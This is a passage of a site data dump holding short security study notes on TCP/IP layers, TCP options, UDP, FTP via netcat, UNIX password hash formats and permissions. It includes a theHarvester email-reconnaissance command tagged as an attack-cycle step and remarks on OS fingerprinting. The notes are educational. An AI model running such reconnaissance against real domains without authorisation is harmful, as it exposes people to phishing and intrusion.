role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#the-tcp-model&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Layer 4: Application (highest)&lt;/li&gt;\n&lt;li&gt;Layer 3: Transport&lt;/li&gt;\n&lt;li&gt;Layer 2: Internet&lt;/li&gt;\n&lt;li&gt;Layer 1: Network interface (lowest)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;osi-vs-tcp-models&quot;&gt;OSI vs. TCP models&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#osi-vs-tcp-models&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;em&gt;Roughly&lt;/em&gt;, the TCP Model encapsulates the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/OSI-model&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/OSI-model&quot;&gt;OSI Model&lt;/a&gt;.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;+--------------+-------------------+\n| OSI LAYER    | TCP/IP LAYER      |\n+--------------+-------------------+\n| Application  |                   |\n+--------------+                   |\n| Presentation | Application       |\n+--------------+                   |\n| Session      |                   |\n+--------------+-------------------+\n| Transport    | Transport         |\n+--------------+-------------------+\n| Network      | Internet          |\n+--------------+-------------------+\n| Data Link    |                   |\n+--------------+ Network Interface |\n| Physical     |                   |\n+--------------+-------------------+\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=&quot;packet-headers&quot;&gt;Packet headers&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#packet-headers&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;TCP-headers&quot; data-block=&quot;&quot; data-embed-alias=&quot;TCP headers&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-headers&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/TCP-headers&quot;&gt;Transclude of TCP-headers&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;tcp-window-size&quot;&gt;TCP window size&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#tcp-window-size&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;TCP-window-size&quot; data-block=&quot;&quot; data-embed-alias=&quot;TCP window size&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-window-size&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/TCP-window-size&quot;&gt;Transclude of TCP-window-size&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;tcp-options&quot;&gt;TCP options&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#tcp-options&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;TCP “options” are set in the initial handshake (the initiating host will propose in the SYN packet, and the receiving host will reply with what it supports in the SYN/ACK packet). Note that each system sets its own window scale and MSS values (but these value must be set by both hosts in order to be used in a connection).&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Window Scale — Set the &lt;em&gt;multiplier&lt;/em&gt; for the window size (see above) as as a power of two, such that a “Window scale” of 7 is a multiplier of 2⁷ = 128. Window scales can be up to 14, which allows (once multiplied with the maximum window size) &lt;em&gt;up to&lt;/em&gt; 1 GB of data to be transmitted before an ACK is &lt;em&gt;required&lt;/em&gt;. Typically set to 2 for webservers, or to 0 for systems that wish to allow the use of this option in a conversation but don’t support large buffers themselves.&lt;/li&gt;\n&lt;li&gt;Maximum Segment Size (MSS) — The maximum data segment size that a system can receive. This is different than the window size, which is the amount of data that a system expects before it gets an ACK (it’s basically that system’s buffer for this connection).&lt;/li&gt;\n&lt;li&gt;Selective Acknowledgement (SACK) — Allows for packets to be acknowledged as they are received, rather than at the end of a window. Using SACK allows for dropped packets to be retransmitted sooner, and prevents the retransmission of packets that were properly received &lt;em&gt;after&lt;/em&gt; a dropped packet. However, using SACK requires that the transmitting host keep track of what packets were sent in memory, which means that it’s typically not set on resource-constrained systems (IoT, etc.).&lt;/li&gt;\n&lt;li&gt;No-Op (NOP) — A “blank” value (01) used to pad out the options field, since header size must be a power of two &lt;em&gt;bytes&lt;/em&gt; but (1) each option need to fall on a byte boundary and (2) we may not have enough options to fill out the space requested. How NOPs are used is highly implementation-dependent. NOPs can also be used by middle-boxes (firewalls, routers, etc.) to &lt;em&gt;strip&lt;/em&gt; options.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;If SACK is used, then acknowledge packet numbers are also placed in the options block.&lt;/p&gt;\n&lt;p&gt;Differences in how TCP options are responded to for incoming SYN packets or ordered for outgoing SYN/ACK packets are important for fingerprinting operating systems and TCP stacks.&lt;/p&gt;\n&lt;h2 id=&quot;the-initial-round-trip-time&quot;&gt;The initial round trip time&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#the-initial-round-trip-time&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The “initial round trip time” (IRTT) is the time taken for the initial SYN packet in the TCP handshake to the final ACK packet in the initial three-way handshake. Most TCP implementations will &lt;em&gt;initially&lt;/em&gt; wait for up to 0.5 seconds until retransmitting a packet, but will dynamically adjust this to 3x – 4x the IRTT after the initial handshake. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Wireshark&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wireshark&quot;&gt;Wireshark&lt;/a&gt; will report the IRTT value in the final ACK packet of the three-way handshake.&lt;/p&gt;"},"spells/Telnet":{"slug":"spells/Telnet","filePath":"spells/Telnet.md","title":"Telnet","links":["spells/TCP"],"tags":["Application/telnet","Protocol/Telnet","Protocol/TCP"],"content":"The default port for telnetd is TCP 23.","richContent":"&lt;p&gt;The default port for telnetd is &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 23.&lt;/p&gt;"},"spells/The-Harvester":{"slug":"spells/The-Harvester","filePath":"spells/The Harvester.md","title":"The Harvester","links":[],"tags":["Application/TheHarvester","AttackCycle/Reconnaissance"],"content":"theHarvester -d $EMAIL_DOMAIN -b $SERVICE_TO_SEARCH","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;theHarvester&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $EMAIL_DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVICE_TO_SEARCH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Transfer-files-over-FTP-using-netcat":{"slug":"spells/Transfer-files-over-FTP-using-netcat","filePath":"spells/Transfer files over FTP using netcat.md","title":"Transfer files over FTP using netcat","links":["spells/FTP","spells/netcat"],"tags":["Application/netcat","Protocol/FTP","HowTo"],"content":"Note that you cannot receive files using FTP with a single telnet/netcat session, as file transfers are conducted over a separate channel (either a channel originating from port 20 on the server for “active” mode or a random port above 1023 on the client for “passive” mode).\nHowever, you can retrieve files using two sessions.\n\nSwitch to passive mode (PASV).\nThe FTP server will reply with a string of the form (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address and p1 – p2 are the high + low bytes of the port number to connect to.\nUse (256 × p1) + p2 to determine the decimal port number. For example, if p1 = 117 and p2 = 85, then then port number you need to connect to is 30037.\nConnect a second telnet/netcat client to the IP + port provided by the server.\nIssue the appropriate file retrieval (RETR) command in the original telnet/netcat client. The file will be sent to the second client.\n\nWhich is a lot of work, but sometimes you just don’t have an FTP client.","richContent":"&lt;p&gt;Note that you cannot receive files using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; with a &lt;em&gt;single&lt;/em&gt; telnet/&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; session, as file transfers are conducted over a separate channel (either a channel originating from port 20 on the server for “active” mode or a random port above 1023 on the client for “passive” mode).&lt;/p&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;However, you &lt;em&gt;can&lt;/em&gt; retrieve files using &lt;em&gt;two&lt;/em&gt; sessions.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Switch to passive mode (PASV).&lt;/li&gt;\n&lt;li&gt;The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; server will reply with a string of the form (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address and p1 – p2 are the high + low bytes of the port number to connect to.&lt;/li&gt;\n&lt;li&gt;Use (256 × p1) + p2 to determine the decimal port number. For example, if p1 = 117 and p2 = 85, then then port number you need to connect to is 30037.&lt;/li&gt;\n&lt;li&gt;Connect a &lt;em&gt;second&lt;/em&gt; telnet/&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; client to the IP + port provided by the server.&lt;/li&gt;\n&lt;li&gt;Issue the appropriate file retrieval (RETR) command in the original telnet/&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; client. The file will be sent to the second client.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Which is a lot of work, but sometimes you just don’t have an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; client.&lt;/p&gt;"},"spells/UDP":{"slug":"spells/UDP","filePath":"spells/UDP.md","title":"UDP","links":[],"tags":["Protocol/UDP"],"content":"Important parts of a UDP packet:\n\nTime to Live (TTL) — How long a packet should live on the network before being discarded.\nSource port — A random (unused) port chosen by the sender.\nDestination port — The port on the receiving end, which normally is determined by the application being used.\nSource address — “From” IP address.\nDestination address — “To” IP address.\nData — The, well, data.\n","richContent":"&lt;p&gt;Important parts of a UDP packet:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Time to Live (TTL) — How long a packet should live on the network before being discarded.&lt;/li&gt;\n&lt;li&gt;Source port — A random (unused) port chosen by the sender.&lt;/li&gt;\n&lt;li&gt;Destination port — The port on the receiving end, which normally is determined by the application being used.&lt;/li&gt;\n&lt;li&gt;Source address — “From” IP address.&lt;/li&gt;\n&lt;li&gt;Destination address — “To” IP address.&lt;/li&gt;\n&lt;li&gt;Data — The, well, data.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/UNIX-file-descriptors":{"slug":"spells/UNIX-file-descriptors","filePath":"spells/UNIX file descriptors.md","title":"UNIX file descriptors","links":[],"tags":["OS/Linux","OS/AIX","Language/Bash","OS/macOS","Standard/POSIX"],"content":"There are three file descriptors that every application has access to:\n\nSTDIN — 0\nSTDOUT — 1\nSTDERR — 2\n\nAdditional file descriptors can also be created in an ad hoc fashion.","richContent":"&lt;p&gt;There are three file descriptors that every application has access to:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;STDIN — 0&lt;/li&gt;\n&lt;li&gt;STDOUT — 1&lt;/li&gt;\n&lt;li&gt;STDERR — 2&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/7082001/how-do-file-descriptors-work/7082184#7082184&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Additional file descriptors can also be created in an ad hoc fashion.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;"},"spells/UNIX-password-hashes":{"slug":"spells/UNIX-password-hashes","filePath":"spells/UNIX password hashes.md","title":"UNIX password hashes","links":[],"tags":["OS/Linux","Cryptography/Hashes/MD5","Cryptography/Hashes/bcrypt","Cryptography/Hashes/SHA512"],"content":"UNIX-style passwords are of the form $format$rounds$salt$hash. Common format parameters:\n\n1 — md5crypt (mostly older)\n2, 2a, 2b, 2x, 2y — bcrypt (generally web apps)\n6 — sha512crypt (most modern systems)\n\nBoth $rounds and $salt are optional (salts are never purely numeric, so it’s easy to tell these apart).\nBcrypt is designed to take approximately the same amount of time when hashed on a CPU vs. a GPU, which is one reason it’s considered more resistant to cracking.\n\n\n                  \n                  Note\n                  \n                \n\n\n1 hex digit = 4 bits (2 hex digits per byte), which is why a 128-bit md5 hash is 32 characters long.\n\n\n","richContent":"&lt;p&gt;UNIX-style passwords are of the form &lt;code&gt;$format$rounds$salt$hash&lt;/code&gt;. Common &lt;code&gt;format&lt;/code&gt; parameters:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;1 — md5crypt (mostly older)&lt;/li&gt;\n&lt;li&gt;2, 2a, 2b, 2x, 2y — bcrypt (generally web apps)&lt;/li&gt;\n&lt;li&gt;6 — sha512crypt (most modern systems)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Both &lt;code&gt;$rounds&lt;/code&gt; and &lt;code&gt;$salt&lt;/code&gt; are optional (salts are never purely numeric, so it’s easy to tell these apart).&lt;/p&gt;\n&lt;p&gt;Bcrypt is designed to take approximately the same amount of time when hashed on a CPU vs. a GPU, which is one reason it’s considered more resistant to cracking.&lt;/p&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;1 hex digit = 4 bits (2 hex digits per byte), which is why a 128-bit md5 hash is 32 characters long.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/UNIX-permissions":{"slug":"spells/UNIX-permissions","filePath":"spells/UNIX permissions.md","title":"UNIX permissions","links":["spells/find"],"tags":["OS/Linux","OS/macOS","OS/AIX","Standard/POSIX"],"content":"Numeric permissions are sometimes called absolute permissions, because they exactly specify an object’s permissions. Symbolic permissions are a bit more flexible.\nLike absolute permissions, symbolic permissions are divided into user (u), group (g), and others (o). Unlike absolute permissions, not all of these permission sets need to be specified. Sets are separated by commas, and identical sets can be combined (e.g., ug).\nThis specifier is then followed by an operator that specifies whether the following permissions should be granted (+), removed (-), or set exactly (=). (Note that for find only = makes sense.)\n*NIX permissions are represented as one or more of the following:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPermissionSymbolicNumericReadr4Writew2Executex1SUIDs/S4SGIDs/S2Sticky Bitt1\nThe SUID/SGID bits are applied to the user or group (respectively) when set symbolically; the sticky bit is applied to the “other” permission set. When set numerically, all three of these values are applied to the “prefix” digit.\nSymbolically, the SUID/SGID bits can be represented as either s or S. The different is whether the user/group also has execute permissions (s), or lacks these permissions (S).\nSUID\nExecute as the file owner, rather than the user passing the command.\nSGID\nIf set on a file, this operates similarly to SUID: The file is executed as if the user passing the command was in the group with the SGID bit set. (I honestly have rarely seen this used.)\nIf set on a directory, files created in the directory will have their group ownership set to the same group as the directory itself. (In my experience this is the more common use case.)\nSticky bit\nOnly applied to directories. A file in a directory with the sticky bit set can only be deleted by its owner (and root). For example, /tmp always has the sticky bit set.\nWrite permissions and directories\nIf a user has write access to a directory, then they can write to any file they have at least read access to (!!!).","richContent":"&lt;p&gt;Numeric permissions are sometimes called &lt;em&gt;absolute&lt;/em&gt; permissions, because they exactly specify an object’s permissions. &lt;a href=&quot;https://www.redhat.com/sysadmin/manage-permissions&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Symbolic permissions are a bit more flexible.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;Like absolute permissions, symbolic permissions are divided into user (&lt;code&gt;u&lt;/code&gt;), group (&lt;code&gt;g&lt;/code&gt;), and others (&lt;code&gt;o&lt;/code&gt;). &lt;em&gt;Unlike&lt;/em&gt; absolute permissions, not all of these permission sets need to be specified. Sets are separated by commas, and identical sets can be combined (e.g., &lt;code&gt;ug&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;This specifier is then followed by an &lt;em&gt;operator&lt;/em&gt; that specifies whether the following permissions should be granted (&lt;code&gt;+&lt;/code&gt;), removed (&lt;code&gt;-&lt;/code&gt;), or set exactly (&lt;code&gt;=&lt;/code&gt;). (Note that for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/find&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/find&quot;&gt;find&lt;/a&gt; only &lt;code&gt;=&lt;/code&gt; makes sense.)&lt;/p&gt;\n&lt;p&gt;*NIX permissions are represented as one or more of the following:&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;Permission&lt;/th&gt;&lt;th align=&quot;center&quot;&gt;Symbolic&lt;/th&gt;&lt;th align=&quot;center&quot;&gt;Numeric&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Read&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;r&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Write&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;w&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;2&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Execute&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;x&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;SUID&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;s&lt;/code&gt;/&lt;code&gt;S&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;SGID&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;s&lt;/code&gt;/&lt;code&gt;S&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;2&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Sticky Bit&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;t&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;The &lt;a href=&quot;https://www.redhat.com/sysadmin/suid-sgid-sticky-bit&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;SUID/SGID bits&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; are applied to the user or group (respectively) when set symbolically; the sticky bit is applied to the “other” permission set. When set numerically, all three of these values are applied to the “prefix” digit.&lt;/p&gt;\n&lt;p&gt;Symbolically, the SUID/SGID bits can be represented as either &lt;code&gt;s&lt;/code&gt; or &lt;code&gt;S&lt;/code&gt;. The different is whether the user/group &lt;em&gt;also&lt;/em&gt; has execute permissions (&lt;code&gt;s&lt;/code&gt;), or lacks these permissions (&lt;code&gt;S&lt;/code&gt;).&lt;/p&gt;\n&lt;h2 id=&quot;suid&quot;&gt;SUID&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#suid&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Execute as the file owner, rather than the user passing the command.&lt;/p&gt;\n&lt;h2 id=&quot;sgid&quot;&gt;SGID&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#sgid&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If set on a file, this operates similarly to SUID: The file is executed as if the user passing the command was in the &lt;em&gt;group&lt;/em&gt; with the SGID bit set. (I honestly have rarely seen this used.)&lt;/p&gt;\n&lt;p&gt;If set on a directory, files created in the directory will have their group ownership set to the same group as the directory itself. (In my experience this is the more common use case.)&lt;/p&gt;\n&lt;h2 id=&quot;sticky-bit&quot;&gt;Sticky bit&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#sticky-bit&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; 